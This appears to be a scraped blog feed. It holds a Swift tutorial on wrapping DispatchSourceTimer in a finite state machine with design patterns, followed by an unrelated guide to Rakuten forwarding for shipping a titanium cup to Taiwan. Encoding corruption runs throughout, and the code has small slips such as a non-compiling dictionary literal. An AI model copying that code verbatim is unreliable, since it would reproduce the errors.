DispatchSourceTimer with Finite State Machine and Design Patterns for Safer and Easier Use.Photo by Ralph HutterAbout TimerIn iOS development, the ‚ÄúTimer trigger‚Äù is a common requirement; from UI aspects like showing countdowns and banner carousels to data logic tasks like scheduled event sending and periodic data cleanup, we rely on timers to help achieve these goals.Foundation ‚Äî Timer (NSTimer)Timer is probably the most intuitive API that comes to mind first, but there are several points to consider when choosing and using Timer.Advantages and DisadvantagesAdvantages of Timer: By default, it integrates with UI work and does not require explicitly switching to the Main Thread. Automatically adjusts trigger timing to optimize power usage Lower complexity, at most causing retain cycles or forgetting to stop the Timer, but will not directly cause a crash Disadvantages of Timer: Accuracy is affected by the RunLoop state and may be delayed during high UI interaction or mode switching. Does not support advanced operations like suspend, resume, activate, etc. Suitable ScenariosUI-level needs, such as carousel banners (auto-scrolling ScrollView) or coupon countdown timers; these scenarios only require the user to respond to content in the current foreground screen. I choose to use Timer directly for a convenient, fast, and safe solution.LifecycleCreating a Timer on the UI Main Thread means the Timer is strongly held by the Main Thread‚Äôs RunLoop and is periodically triggered by the RunLoop‚Äôs polling mechanism. It will only be released when Timer.invalidate() is called. Therefore, we need to strongly hold the Timer in the ViewController and call Timer.invalidate() in deinit to properly stop and release the Timer after the view is dismissed. ‚≠êÔ∏èÔ∏èÔ∏èView Controller strongly retains Timer, the Timer‚Äôs Execution Block (handler/closure) must use Weak Self; otherwise, it will cause a Retain Cycle. ‚≠êÔ∏èÔ∏èÔ∏è Be sure to call Timer invalidate() at the end of the View Controller lifecycle; otherwise, the RunLoop will still hold the Timer and keep it running. RunLoop is an event processing loop within a Thread that polls and handles events; the system automatically creates a RunLoop for the Main Thread (RunLoop.main), but other Threads may not have a RunLoop.UsageWe can directly use Timer.scheduledTimer to declare a Timer (it automatically adds to RunLoop.main &amp; Mode: .default):final class HomeViewController: UIViewController { private var timer: Timer? deinit { self.timer?.invalidate() self.timer = nil } override func viewDidLoad() { super.viewDidLoad() startCarousel() } private func startCarousel() { self.timer = Timer.scheduledTimer(withTimeInterval: 1, repeats: true, block: { [weak self] _ in self?.doSomething() }) } private func doSomething() { print(\"Hello World!\") }}You can also declare a Timer object yourself and add it to the RunLoop:let timer = Timer(timeInterval: 1.0, repeats: true) { [weak self] _ in // do something..}self.timer = timer// Adding to RunLoop starts the timerRunLoop.main.add(timer, forMode: .default)How to Use Timer invalidate() stops the Timer fire() triggers immediately once The Impact of RunLoop Mode .default: The default added mode, mainly handles UI display.Will pause first when switching to .tracking mode .tracking: Handles ScrollView scrolling and Gesture recognition. .common: Handles both .default and .tracking. ‚≠êÔ∏èÔ∏èÔ∏è‚≠êÔ∏èÔ∏èÔ∏è‚≠êÔ∏èÔ∏èÔ∏èTherefore, by default, our Timer is added to the .default mode, which will automatically pause when the user scrolls a ScrollView or performs gestures, and will only resume after the interaction ends. This may cause the Timer to trigger late or fire fewer times than expected.For this, we can add Timer to the .common Mode to solve the above issue:RunLoop.main.add(timer, forMode: .common)Grand Central Dispatch ‚Äî DispatchSourceTimerBesides Timer, GCD also provides another option called DispatchSourceTimer.Advantages and DisadvantagesAdvantages of DispatchSourceTimer: Better operational flexibility (supports suspend and resume) Higher accuracy and reliability: depends on GCD queue Leeway can be set manually to control power consumption Stable resident task (GCD queue) Disadvantages of DispatchSourceTimer: UI operations require manually switching back to the Main Thread The API is complex and order-dependent; using it incorrectly will cause a crash Encapsulation Is Needed for Safe Usage Suitable ScenariosCompared to Timer, which is suitable for UI-related scenarios, DispatchSourceTimer is better suited for tasks unrelated to the UI or the current user screen. The most common use cases are sending tracking events, where user-generated events are periodically sent to the server, or regularly cleaning up unused CoreData data. These tasks are ideal for using DispatchSourceTimer.Life CycleThe lifecycle of DispatchSourceTimer depends on whether it is still retained by an external object; the GCD queue itself does not strongly retain the timer‚Äôs owner and only handles scheduling and executing events.Crash IssuesAlthough DispatchSourceTimer offers more control methods: activate, suspend, resume, cancel; it is extremely sensitive, and calling them in the wrong order will cause immediate crashes (EXC_BREAKPOINT/DispatchSourceTimer), which is very dangerous.The following situations will cause an immediate crash: ‚ùå suspend() and resume() are not used in pairsCalling suspend() again after suspend()Calling resume() again after resume() ‚ùå Calling cancel() after suspend()You need to call resume() before cancel() ‚ùå Timer is released (nil) while in suspend() state ‚ùå Calling other operations after cancel() Using Finite-State Machine to Encapsulate OperationsMoving on to another key point of this article: How to safely use DispatchSourceTimer?As shown in the above image, we use a finite state machine to encapsulate DispatchSourceTimer operations, making it safer and easier to use:final class DispatchSourceTimerMachine { // States of the finite state machine private enum TimerState { // Initial state case idle // Running case running // Suspended case suspended // Cancelled case cancelled } private var timer: DispatchSourceTimer? private lazy var timerQueue: DispatchQueue = { DispatchQueue(label: \"li.zhgchg.DispatchSourceTimerMachine\", qos: .background) }() private var _state: TimerState = .idle deinit { // When the owner object is deallocated, cancel the timer synchronously // Not mandatory (handler is weak), but ensures the flow is as expected if _state == .suspended { timer?.resume() _state = .running } if _state == .running { timer?.cancel() timer = nil _state = .cancelled } } // Start the Timer func activate(repeatTimeInterval: DispatchTimeInterval, handler: DispatchSource.DispatchSourceHandler?) { // Timer can only be activated in idle or cancelled state guard [.idle, .cancelled].contains(_state) else { return } // Create Timer and activate() let timer = makeTimer(repeatTimeInterval: repeatTimeInterval, handler: handler) self.timer = timer timer.activate() // Switch to running state _state = .running } // Suspend the Timer func suspend() { // Timer can only be suspended when running guard [.running].contains(_state) else { return } // Suspend Timer timer?.suspend() // Switch to suspended state _state = .suspended } // Resume the Timer func resume() { // Timer can only be resumed when suspended guard [.suspended].contains(_state) else { return } // Resume Timer timer?.resume() // Switch to running state _state = .running } // Cancel the Timer func cancel() { // Timer can only be cancelled when suspended or running guard [.suspended, .running].contains(_state) else { return } // If currently suspended, resume first before cancelling // This is a DispatchSourceTimer limitation; can only cancel when running if _state == .suspended { self.resume() } // Cancel Timer timer?.cancel() timer = nil // Switch to cancelled state _state = .cancelled } private func makeTimer(repeatTimeInterval: DispatchTimeInterval, handler: DispatchSourceProtocol.DispatchSourceHandler?) -&gt; DispatchSourceTimer { let timer = DispatchSource.makeTimerSource(queue: timerQueue) timer.schedule(deadline: .now(), repeating: repeatTimeInterval) timer.setEventHandler(qos: .background, handler: handler) return timer }}We simply use a finite state machine to encapsulate the logic of ‚Äúwhich states can transition to which‚Äù and ‚Äúwhat actions each state requires.‚Äù Calls made in the wrong state are ignored (no crashes). We also added some optimizations, such as allowing cancel in the suspended state and reactivating from the cancelled state. Further Reading: Previously, I wrote another article ‚ÄúDesign Patterns Practical ApplicationÔΩúEncapsulating Socket.IO Real-time Communication Architecture‚Äù, where I also used a finite state machine and additionally applied the State Pattern. Finite-State Machine: Focuses on controlling state transitions and the actions to perform. State Pattern: Focuses on the behavior logic within each state.Using Serial Queue to Manage Finite State Machine TransitionsEven after ensuring safe use of DispatchSourceTimer with a state machine, the issue is not fully resolved. We cannot guarantee that calls to DispatchSourceTimerMachine from outside occur on the same thread. If multiple threads operate on this object, race conditions may still cause crashes.final class DispatchSourceTimerMachine { // States of the finite state machine private enum TimerState { // Initial state case idle // Running case running // Suspended case suspended // Cancelled case cancelled } private var timer: DispatchSourceTimer? private lazy var timerQueue: DispatchQueue = { DispatchQueue(label: \"li.zhgchg.DispatchSourceTimerMachine\", qos: .background) }() private var _state: TimerState = .idle private static let operationQueueSpecificKey = DispatchSpecificKey&lt;ObjectIdentifier&gt;() private lazy var operationQueueSpecificValue: ObjectIdentifier = ObjectIdentifier(self) private lazy var operationQueue: DispatchQueue = { let queue = DispatchQueue(label: \"li.zhgchg.DispatchSourceTimerMachine.operationQueue\") queue.setSpecific(key: Self.operationQueueSpecificKey, value: operationQueueSpecificValue) return queue }() private func operation(async: Bool = true, _ work: @escaping () -&gt; Void) { if DispatchQueue.getSpecific(key: Self.operationQueueSpecificKey) == operationQueueSpecificValue { work() } else { if async { operationQueue.async(execute: work) } else { operationQueue.sync(execute: work) } } } deinit { // When the owner object disappears, synchronously cancel the timer // Not required (handler is weak), but ensures the flow is as expected // Ensure sync execution completes operation(async: false) { [self] in if _state == .suspended { timer?.resume() _state = .running } if _state == .running { timer?.cancel() timer = nil _state = .cancelled } } } // Start the Timer func activate(repeatTimeInterval: DispatchTimeInterval, handler: DispatchSource.DispatchSourceHandler?) { operation { [weak self] in guard let self = self else { return } // Only idle or cancelled states can activate the Timer guard [.idle, .cancelled].contains(_state) else { return } // Create Timer and activate() let timer = makeTimer(repeatTimeInterval: repeatTimeInterval, handler: handler) self.timer = timer timer.activate() // Switch to running state _state = .running } } // Suspend the Timer func suspend() { operation { [weak self] in guard let self = self else { return } // Only running state can suspend the Timer guard [.running].contains(_state) else { return } // Suspend the Timer timer?.suspend() // Switch to suspended state _state = .suspended } } // Resume the Timer func resume() { operation { [weak self] in guard let self = self else { return } // Only suspended state can resume the Timer guard [.suspended].contains(_state) else { return } // Resume the Timer timer?.resume() // Switch to running state _state = .running } } // Cancel the Timer func cancel() { operation { [weak self] in guard let self = self else { return } // Only suspended or running states can cancel the Timer guard [.suspended, .running].contains(_state) else { return } // If currently suspended, resume first then cancel // This is a DispatchSourceTimer limitation: can only cancel when running if _state == .suspended { self.resume() } // Cancel the Timer timer?.cancel() timer = nil // Switch to cancelled state _state = .cancelled } } private func makeTimer(repeatTimeInterval: DispatchTimeInterval, handler: DispatchSourceProtocol.DispatchSourceHandler?) -&gt; DispatchSourceTimer { let timer = DispatchSource.makeTimerSource(queue: timerQueue) timer.schedule(deadline: .now(), repeating: repeatTimeInterval) timer.setEventHandler(qos: .background, handler: handler) return timer }}Now, we can safely use the DispatchSourceTimerMachine object as a Timer without worries:final class TrackingEventSender { private let timerMachine = DispatchSourceTimerMachine() public var events: [String: String] = [] // Start periodic tracking func startTracking() { timerMachine.activate(repeatTimeInterval: .seconds(30)) { [weak self] in self?.sendTrackingEvent() } } // Pause tracking (e.g., when App goes to background) func pauseTracking() { timerMachine.suspend() } // Resume tracking (e.g., when App returns to foreground) func resumeTracking() { timerMachine.resume() } // Stop tracking (e.g., when leaving the page) func stopTracking() { timerMachine.cancel() } private func sendTrackingEvent() { // send events to server... }}The section on how to safely use DispatchSourceTimer has ended. Next, we will extend to several Design Patterns to help us abstract objects for testing and to abstract the execution logic of DispatchSourceHandler.Extension ‚Äî Using Adapter Pattern + Factory Pattern to Create DispatchSourceTimer (Facilitates Abstract Testing)DispatchSourceTimer is a GCD Objective-C object, making it difficult to mock in tests (no Protocol available); therefore, we need to define our own Protocol + Factory Pattern to generate it, allowing TimerStateMachine to be testable.Adapter Pattern‚Äî Encapsulating DispatchSourceTimer Operations:public protocol TimerAdapter { func schedule(repeating: DispatchTimeInterval) func setEventHandler(handler: DispatchSourceProtocol.DispatchSourceHandler?) func activate() func suspend() func resume() func cancel()}// Adapter implementation for DispatchSourceTimerfinal class DispatchSourceTimerAdapter: TimerAdapter { // Original DispatchSourceTimer private let timer: DispatchSourceTimer init(label: String = \"li.zhgchg.DispatchSourceTimerAdapter\") { let queue = DispatchQueue(label: label, qos: .background) let timer = DispatchSource.makeTimerSource(queue: queue) self.timer = timer } func schedule(repeating: DispatchTimeInterval) { timer.schedule(deadline: .now(), repeating: repeating) } func setEventHandler(handler: DispatchSourceProtocol.DispatchSourceHandler?) { timer.setEventHandler(qos: .background, handler: handler) } func activate() { timer.activate() } func suspend() { timer.suspend() } func resume() { timer.resume() } func cancel() { timer.cancel() }}Factory Pattern ‚Äî Abstract method to create TimerAdapter:protocol DispatchSourceTimerAdapterFactorySpec { func makeTimer(repeatTimeInterval: DispatchTimeInterval, handler: DispatchSourceProtocol.DispatchSourceHandler?) -&gt; TimerAdapter}// Encapsulates the creation steps of DispatchSourceTimerAdapterfinal class DispatchSourceTimerAdapterFactory: DispatchSourceTimerAdapterFactorySpec { public func makeTimer(repeatTimeInterval: DispatchTimeInterval, handler: DispatchSourceProtocol.DispatchSourceHandler?) -&gt; TimerAdapter { let timer = DispatchSourceTimerAdapter() timer.schedule(repeating: repeatTimeInterval) timer.setEventHandler(handler: handler) return timer }}Combined Usage:var stateMachine = DispatchSourceTimerMachine(timerFactory: DispatchSourceTimerAdapterFactory())//final class DispatchSourceTimerMachine { // Omitted.. private var timer: TimerAdapter? private let timerFactory: DispatchSourceTimerAdapterFactorySpec public init(timerFactory: DispatchSourceTimerAdapterFactorySpec) { self.timerFactory = timerFactory } // Omitted.. func activate(repeatTimeInterval: DispatchTimeInterval, handler: DispatchSource.DispatchSourceHandler?) { onQueue { [weak self] in guard let self else { return } guard [.idle, .cancelled].contains(_state) else { return } // Use Factory to make Timer let timer = timerFactory.makeTimer(repeatTimeInterval: repeatTimeInterval, handler: handler) self.timer = timer timer.activate() _state = .running } } // Omitted..}This allows us to write Mock Objects for TimerAdapter / DispatchSourceTimerAdapterFactorySpec during testing to run unit tests.Extension ‚Äî Using the Strategy Pattern to Encapsulate DispatchSourceHandler TasksAssuming we want the DispatchSourceHandler to execute tasks that can change dynamically, we can use the Strategy Pattern to encapsulate the work content.TrackingHandlerStrategy:protocol TrackingHandlerStrategy { static var target: String { get } func execute()}// Home Eventfinal class HomeTrackingHandlerStrategy: TrackingHandlerStrategy { static var target: String = \"home\" func execute() { // fetch home event logs..and send }}// Product Eventfinal class ProductTrackingHandlerStrategy: TrackingHandlerStrategy { static var target: String = \"product\" func execute() { // fetch product event logs..and send }}Combined Usage:var sender = TrackingEventSender()sender.register(event: HomeTrackingHandlerStrategy())sender.register(event: ProductTrackingHandlerStrategy())sender.startTracking()// ...//final class TrackingEventSender { private let timerMachine = DispatchSourceTimerMachine() private var events: [String: TrackingHandlerStrategy] = [:] // Register required event strategies func register(event: TrackingHandlerStrategy) { events[type(of: event).target] = event } func retrive&lt;T: TrackingHandlerStrategy&gt;(event: T.Type) -&gt; T? { return events[event.target] as? T } // Start periodic tracking func startTracking() { timerMachine.activate(repeatTimeInterval: .seconds(30)) { [weak self] in self?.events.values.forEach { event in event.execute() } } } // Pause tracking (e.g., app enters background) func pauseTracking() { timerMachine.suspend() } // Resume tracking (e.g., app enters foreground) func resumeTracking() { timerMachine.resume() } // Stop tracking (e.g., page leaves) func stopTracking() { timerMachine.cancel() }}AcknowledgmentsThanks to Ethan Huang for donating 5 Beers: Indeed, I haven‚Äôt written much for almost half a year. Just started a new job and am continuously seeking inspiration! üí™ The next article might share the process of managing certificates with Fastlane Match and setting up a Self-hosted Runner, or it could cover Bitbucket Pipeline, or the AppStoreConnect API‚Ä¶Further Reading Practical Application of Design Patterns (Encapsulating Socket.io) Practical Application of Design Patterns (Encapsulating WKWebView) Visitor Pattern in Swift Visitor Pattern in TableView If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Japan Overseas ShoppingÔΩúRakuten Consolidated Shipping for TaiwanÔΩúBuy from Rakuten & Amazon", "url": "/posts/zrealm-life/japan-overseas-shopping-rakuten-consolidated-shipping-for-taiwan-buy-from-rakuten-amazon-bea62c251f1b/", "categories": "ZRealm Life.", "tags": "life, unboxing, rakuten, titanium-cup, consolidated-shipping, english, ai-translation", "date": "2025-10-26 17:58:35 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!How to Shop from Japan and Ship to Taiwan ‚Äî Using Rakuten Shipping to Buy Raku...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!How to Shop from Japan and Ship to Taiwan ‚Äî Using Rakuten Shipping to Buy Rakuten Market and Amazon Products (Horie Titanium Cup) with Delivery in as Fast as 4 DaysBuying what you want yourself: A record and guide for using Rakuten Shipping to purchase Japanese products and ship them back to Taiwan, using the Horie titanium cup as an example.Horie Titanium CupThe main features of the Horie titanium cup that impressed me during my last trip to Japan:Official Horie Rakuten Store Exclusive oxidation coloring pattern technology, offering vibrant and brilliant colors with multiple options Exclusive double-layer insulation structure keeps drinks cold without condensation and hot without burning hands Exclusive special inner cup surface design that automatically creates long-lasting dense foam when drinking beer Narrow cup opening that won‚Äôt scratch your lips Made of pure titanium, very light, antibacterial, and odor-free What attracted me the most were the first three exclusive technologies Ôºã it is a thermos cup. Besides, I don‚Äôt have any titanium cups yet, and I‚Äôm troubled by the lingering smell problem of thermos cups, so I really want to buy one to try.Product to Purchase: Brand: Horie Titanium Cup Model: Kiln-made Booster / 400ml Style: G4BOfficial price ¬•19,800 yen (about NT $4,080 TWD), free shipping within Japan.I checked the prices in Taiwan, and whether on e-commerce platforms or from individual sellers, they are around NT $5,500. Occasionally, group buys or exhibition events can lower the price to about NT $4,200, which is a good deal to buy.Total Time and Cost for Rakuten Forwarding Consolidation Shipping to TaiwanThe result is stated upfront. Because I needed engraving, it took 7‚Äì10 days to produce. Also, I bought magazines, so I had to wait for them to arrive at the Rakuten forwarding center. Looking at the transit time alone, it took only 1 day for the transfer station to receive the goods, and just 3 days from packing to delivery‚Äîtruly very fast! Total cost including shipping: NT $4,744. (See details in the article; shipping is higher due to the small purchase.) Rakuten Global ExpressSince I was already buying from Japan‚Äôs Rakuten Ichiba, I decided to try Rakuten‚Äôs forwarding/consolidation service. Of course, Rakuten forwarding is not limited to Rakuten purchases; other e-commerce platforms like Amazon JP, Yahoo Shopping / Yahoo Auctions Japan, Mercari, Biccamera, and more can also be shipped. You can earn Rakuten points and use them for payment!Special Protection When Using Rakuten Shipping to Purchase Rakuten ProductsIn addition to providing forwarding/consolidation services, using Rakuten forwarding to purchase items from Rakuten Ichiba also offers the following guarantees: Compensation Service: Paid but Item Not Delivered Compensation Service: Product Damage (Please obtain a damage report issued by the logistics company) Compensation Service: For receiving products that are clearly different from the product description or defective items Compensation Service: If the received branded product is a counterfeit, infringing trademark rights (covered under the Safe Shopping Guarantee for over 1,000 brands) Compensation amount: up to 300,000 yen No handling fees or annual fees For details, please refer to the official instructions.Purchase Protection for Non-Rakuten ItemsIf the purchased item is not from Rakuten Ichiba, basic forwarding shipping protection is provided: Compensation Service: Paid but Item Not Delivered Compensation Service: Product Damage (Please obtain a damage report issued by the logistics company) For details, please refer to the official instructions.Shipping Cost Calculation and QuotationYou can use the official tool to estimate the shipping cost.https://globalexpress.rakuten.co.jp/estimate/?l-id=top_estimateShipping Methods and Taiwan Shipping Rateshttps://globalexpress.rakuten.co.jp/help/deliveryhttps://globalexpress.rakuten.co.jp/help/country/fee?country=TW Please note that the size and weight here are the final figures after consolidation.Registering a Rakuten Japan AccountGo to the Registration Page:Enter your email address, password, and English name, then submit to complete the registration. Here is a random website issue found: If a server error keeps appearing on the Rakuten site, try switching the language to Japanese, and it should work properly. (Possibly a multilingual error)First, complete the real-name verification on Rakuten ShippingAfter registering on Rakuten, you will be automatically logged in when you go to Rakuten Forwarding. First, click the language option and switch to Traditional Chinese for easier operation. Click My Page to activate the forwarding service Go to your inbox to retrieve the verification code and complete the email verification.Next, fill in your name information. Surname (Kanji), Given Name (Kanji): Enter your Chinese name Surname (Katakana), Given Name (Katakana): Fill in your name in Katakana. You can use this website for translation, or use a nickname, for example: „É™„Éº, „Éè„É™„Éº. Activate Rakuten Forwarding Address and Complete Real-Name VerificationStep 1: Agree to the user terms. Some items, such as flammable goods, sprays, and fresh food, are prohibited from shipping.Step 2: Enter your personal information. Be sure to input your real passport name in English and your date of birth.Obtain Your Exclusive Rakuten Forwarding Address Be sure to enter the full forwarding warehouse address, including the final ÁôΩÁü≥Áî∫6‚Äì1 RGX„Çª„É≥„Çø„Éº XXXXXXX with the English letters and numbers, as this is your unique identification address. You can click ‚ÄúAdd Now‚Äù to directly add the address to your Rakuten account. With this address and phone number, you can shop and ship from major Japanese e-commerce sites! However, to ensure your package is safely forwarded to you, please complete the ‚Äúidentity verification process‚Äù before shopping and shipping items.Continue with the identity verification process Prepare your original ID card and mobile phone, then complete the verification through facial recognition. The entire process is self-service and available online 24/7. However, my ID photo was quite different from my current appearance, so the online verification failed and automatically switched to manual review. I received the official notification that the manual review was completed the next day.My PageClick the ‚ÄúMy Page‚Äù or ‚ÄúTop of My Page‚Äù above to go to the My Page homepage:If the verification process is not completed, the following warning message will appear: Please complete the verification before making any purchases.Your Exclusive Shipping Address and InformationYour personalized information will be displayed at the bottom right of the page.Prohibited Items for Shipping to TaiwanPlease confirm whether the item is prohibited before purchasing and shipping it back to Taiwan.https://globalexpress.rakuten.co.jp/help/country/detail?country=TWDifferent shipping methods have different restrictions. Please read carefully. If you want to buy alcohol, cigarettes, or similar items, be sure to check online tutorials first. From what I‚Äôve seen, after the items arrive in Taiwan, you need to present a notification letter and pay additional taxes before the goods are released.Shopping on Rakuten Ichiba ‚Äî Horie Titanium Cup Order Tutorial High insulation titanium double-walled tumbler made in a 1055‚ÑÉ kiln. Allergy-free, hygienic, rust-resistant, lightweight, durable, and long-lasting. Perfect as a gift for loved ones or a reward for yourself. [Free gift wrapping available] HORIE official shop / kiln-made, personalized pure titanium double-walled tumbler horie titanium tumbler for Mother‚Äôs Day, Father‚Äôs Day, Respect for the Aged Day, gifts, beer glass, Horie, Tsubame-Sanjo, birthday presents, farewell gifts, retirement celebrations, thank-you gifts, wedding gifts, SDGs, Christmas Free shipping for 13,200 to 19,800 yenGo to Product Page ÔºöProduct PageThis is the product page for the Kiln Creation series. To choose other series, you can visit the HORIE store homepage.Scroll to the bottom to select the product specifications (ÂïÜÂìÅË©≥Á¥∞„ÇíÈÅ∏Êäû). Shape/Size: Choose the style you want (please refer to the product page images; options include wide-mouth, narrow-mouth, and various capacities) Color: Choose the style you want (please refer to the product page images) I bought: Kiln-made Booster/400ml &amp; G4B:Name Engraving Option: Whether to engrave a name (online store exclusive, free engraving), requires 7‚Äì10 business days:Wrapping Options: Wrapping paper style, A or B or no style.Choice of Paulownia Box Design: Packaging box style, WakuWaku Surprise Edition (left, limited single pack) or Regular Edition (right)Paulownia Wood Box for 2 Sets (‚ÄªCheck only if ordering 2 or more and needed): Check this if buying two or more cups to pack them in the same box (see bottom right in the image).Skip if buying only one.Combination for 2 sets (Example: Premium and Light) (‚ÄªPlease specify if ordering 2 sets or more): How to combine the boxes when buying two or more sets. If it‚Äôs troublesome, it‚Äôs faster to add them separately to the cart.You can skip this if buying only one.Name Engraving Type ‚ÄªIf ordering 2 or more single name-engraved items, please add them to the cart one by one: No engraving needed (skip the fields below). If engraving is required, please select the style and fill in each line of text according to the product page images: Name engraving line 1 Name engraving second line Name engraving, third line Name engraving line 4 Please note that if you want engraving, add each item to the cart separately. Do not write the engraving details in the engraving content field. I chose engraving style B (see image at the end).Gift Wrapping and Greeting Card Styles, Content: Noshi content: Type of congratulatory message, such as ‚ÄúGosh≈´gi‚Äù (celebration), ‚ÄúShukuj≈´‚Äù (birthday wishes), etc. If not needed, select ‚ÄúNo noshi.‚Äù Type of Noshi: Gift tag style, as shown in the image below. If not needed, select ‚ÄúNo Noshi.‚Äù Types of Noshi Mizuhiki: Styles of decorative cords for gift wrapping, as shown in the image below. If not needed, select ‚ÄúNo Noshi.‚Äù Name to be written on the gift wrapping (sender) ‚ÄªFor joint names, please insert ‚Äú„Éª‚Äù between names. If you want furigana for occasions like thank-you gifts, please also enter furigana. If over 20 characters, please write in the remarks column: Please fill in the sender‚Äôs name to be printed on the gift wrapping (noshi). For multiple senders, insert ‚Äú„Éª‚Äù between names; leave blank if not applicable.Add to Cart and Complete CheckoutAfter filling in all the specifications, click ‚Äú„Åã„Åî„Å´ËøΩÂä†‚Äù to add to the cart. For the delivery address, select our Rakuten forwarding service‚Äôs ‚ÄúKanagawa Prefecture.‚Äù Below, the estimated delivery time to Rakuten forwarding and free shipping will be shown. Once everything is set, click the cart icon above to proceed to checkout:After confirming the product specifications are correct, click ‚ÄúProceed to Purchase‚Äù on the right. Delivery Address: You can directly select the newly added Rakuten forwarding address or manually add a forwarding address (make sure to enter the full forwarding address including the final number). Payment Method: I paid by credit card directly (considered a purchase from Japan, so check which banks offer promotions). After confirming everything is correct, click ‚ÄúÊ≥®Êñá„ÇíÁ¢∫ÂÆö„Åô„Çã‚Äù to complete the order.HORIE Engraving ConfirmationIf you choose to have engraving, HORIE will send you a confirmation after receiving the order. If everything is fine, you can reply with ‚Äú„ÅîÈÄÅ‰ªò„ÅÑ„Åü„Å†„ÅÑ„Åü„É¨„Ç§„Ç¢„Ç¶„Éà„ÇíÁ¢∫Ë™ç„Åó„Åæ„Åó„Åü„ÄÇÂïèÈ°å„Åî„Åñ„ÅÑ„Åæ„Åõ„Çì„ÅÆ„ÅßË£Ω‰Ωú„ÇíÈÄ≤„ÇÅ„Å¶„Åè„Å†„Åï„ÅÑ„ÄÇ‚Äù to let them start production.He will also send a message to notify the shipping time.Seller Shipment and Rakuten Forwarding Arrival NotificationAfter receiving the HORIE shipping notification, the package usually arrives at the Rakuten forwarding warehouse within 1‚Äì3 days.Shipping from Amazon JP to Rakuten ForwardingThis time, besides buying the HORIE titanium cup, I also purchased a magazine from Amazon JP in Japan, planning to ship them together back to Taiwan.On the shopping site, simply remember to fill in the shipping address and contact phone number with your Rakuten forwarding information.(Non-Rakuten Market Shopping) Pre-Registration for Package ArrivalFor items not purchased directly from Rakuten, it is recommended to register them after placing the order before shipping to the forwarding address.Click ‚ÄúCargo List‚Äù ‚Üí ‚ÄúRegister/Confirm‚ÄùEnter store, product information, and amount purchased from other platforms.Amazon JP Purchase - Rakuten Shipping Arrival NotificationAfter completing the order, wait for the seller to ship the item. You will receive a notification once the package arrives at the Rakuten forwarding warehouse.Rakuten Forwarding to TaiwanRakuten Global Express offers free storage for up to 30 days. Once all items have arrived and are consolidated, you can request packaging and shipping.Delivered items: a total of three.Click ‚ÄúCargo List‚Äù:Click ‚ÄúSubmit Packaging Request‚ÄùConfirm the contents of the consolidated package for shipping. Once verified, click ‚ÄúConfirm Shipment Package.‚ÄùClick ‚ÄúSelect other paid packaging services.‚ÄùYou can choose the packaging service: (Click the ‚Äúi‚Äù for illustrated instructions) Remove packaging boxes, shoe boxes, flyers, catalogs, delivery slips, etc. to reduce weight and volume, saving on shipping costs. Package Waterproofing Using the reinforced box for international shipping: I selected this option, which basically means using a large cardboard box plus cushioning paper to protect your items. Packaging Request (Choose Shipping Location)Enter the shipping address: Passport English name, English address, your phone number (remove the leading 0 and replace with 886)After submission, the status will change to: Packaging in progress. Please wait for the process to complete before making payment and shipping.I received the packaging completion notification the next morning.Pay Transfer Shipping Fee and Request ShipmentStatus: Awaiting payment.Click ‚ÄúCargo List‚Äù ‚Üí ‚ÄúPending Payment‚Äù cargo ‚Üí ‚ÄúProceed to Payment‚Äù. Final size and weight: 2,330 g, 38 x 30 x 21 cmConfirm the package contents and recipient information. If correct, click ‚ÄúSelect Shipping Method.‚ÄùYou can choose: DHL Express (Super Express Air): 1‚Äì3 days, 9,100 JPYAccording to a friend‚Äôs advice, if you use DHL, remember to apply for tax payment before release to avoid extra handling fees if customs inspects and charges additional taxes. EMS Express Air Shipping: 3‚Äì8 days, 6,550 JPY (I chose this, actually received in 2 days, very fast) ECMS Economy Air Shipping: 6‚Äì11 days, 6,280 JPY Sea shipping: 20‚Äì40 days, 5,620 JPY The price is about the same as the Cost Estimation Tool.Next, enter your credit card or PayPal to complete the payment:Shipping fees also earn Rakuten points (1%)!Shipping Request CompletedStatus will change to: Shipping in progress.Complete EZWay RegistrationIf you have no experience buying items from overseas, be sure to complete EZWay real-name verification by downloading the EZWay App, registering, and completing the verification.Rakuten ShippingAfter Rakuten completes the shipment, you will also receive a notification with a tracking number to check the status of your package. The initial shipping location may not be found; please check again later and it should appear.Waiting for delivery!So far, registration on the Japanese Rakuten site, using Rakuten forwarding, placing orders, shipping, sending back to Taiwan, and EZWay are all done. Now, just wait for the goods to arrive!Rakuten Forwarding, Horie Titanium Cup Unboxing10/14 Requested shipment from Rakuten forwarding, received on 10/16!The two cups plus one magazine actually fit into a small box.Cover with Japanese-style warning stickers.The reinforced box for international shipping includes this cardboard box plus shockproof paper packaging around the sides and bottom.The above is a magazine bought from Amazon (the paper packaging was torn during shipping, but the contents are intact). Below is the Horie titanium cup.The Horie titanium cup‚Äôs original sealed box is placed intact inside the Rakuten forwarding box. It seems you can choose to remove the original packaging during forwarding to reduce volume and weight, saving on shipping costs.Contents: 2 titanium cups.Horie Titanium CupThe overall colors, patterns, and gradients are very vivid and magical, creating an unreal beauty.Open a bottle of draft beer immediately and add ice to test. The ice retention is indeed good, the beer has a creamy foam, tastes great, and it really doesn‚Äôt sweat.Final Cost Calculation Horie Titanium Cup Kiln-made Booster / 400ml ¬•19,800 ‚Äî NT $4,079 Shipping cost per person: NT$665 Customs Duty: Not Charged Total: NT $4,744 spent. Because titanium cups are very light, it‚Äôs a good idea to find a few people to buy together and share the shipping cost. This can reduce the price to about NT4,200. I only bought two, so the shipping cost felt a bit high. Of course, the best deal is to buy directly at a Japanese department store and get a tax refund! The estimated price is around NT$ 3,600.If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Tokyo Area Travel GuideÔΩúKawagoe Little Edo & Atami Fireworks Festival 5-Day 